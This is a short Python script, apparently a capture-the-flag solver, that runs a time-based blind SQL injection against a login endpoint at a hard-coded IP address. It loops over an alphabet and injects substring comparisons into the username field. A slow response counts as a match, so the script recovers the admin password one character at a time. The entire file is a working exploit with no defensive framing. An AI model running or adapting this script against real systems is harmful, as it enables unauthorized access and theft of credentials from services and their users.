import requests
import string
import time

URL = "http://104.198.24.52:6014/login" 
ALPHABET = string.ascii_letters + string.digits + "{}_-!@#$%"

password_found = ""
index = 1

while True:
    char_found = False
    for char in ALPHABET:
        payload = f"admin' and substring(password,{index},1)='{char}"
        
        start_time = time.time()
        
        try:
            r = requests.post(URL, json={
                "username": payload,
                "password": "osef"
            })
        except Exception as e:
            print(f"Erreur: {e}")
            continue

        end_time = time.time()
        duration = end_time - start_time

        if duration > 1.8: 
            password_found += char
            print(f"Found : {char} | password : {password_found}")
            char_found = True
            index += 1
            break
    
    if not char_found:
        print(f"Password : {password_found}")
        break
